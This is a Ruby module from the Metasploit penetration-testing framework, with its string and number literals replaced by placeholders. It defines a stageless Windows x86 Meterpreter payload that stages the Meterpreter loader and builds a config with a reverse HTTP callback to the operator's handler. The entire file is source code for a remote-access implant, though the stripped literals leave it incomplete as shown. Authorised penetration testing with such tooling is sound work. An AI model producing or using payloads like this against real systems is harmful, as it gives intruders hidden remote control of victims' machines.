require <str> require <str> require <str> require <str> require <str> require <str> require <str> module Metasploit4 CachedSize = <int> include Msf :: Payload :: TransportConfig include Msf :: Payload :: Windows include Msf :: Payload :: Single include Msf :: Payload :: Windows :: MeterpreterLoader include Msf :: Sessions :: MeterpreterOptions def initialize ( info = { } ) super ( merge_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > <str> , <str> = > ARCH_X86 , <str> = > Msf :: Handler :: ReverseHttp , <str> = > Msf :: Sessions :: Meterpreter_x86_Win ) ) register_options ( [ OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) ] , self . class ) end def generate stage_meterpreter ( true ) + generate_config end def generate_config ( opts = { } ) opts [ <str> ] || = generate_payload_uuid opts [ <str> ] = true config_opts = { <str> : opts [ <str> ] . arch , <str> : datastore [ <str> ] , <str> : datastore [ <str> ] . to_i , <str> : opts [ <str> ] , <str> : [ transport_config_reverse_http ( opts ) ] , <str> : ( datastore [ <str> ] || <str> ) . split ( <str> ) , <str> : ( datastore [ <str> ] || <str> ) } config = Rex :: Payloads :: Meterpreter :: Config . new ( config_opts ) config . to_b end end 
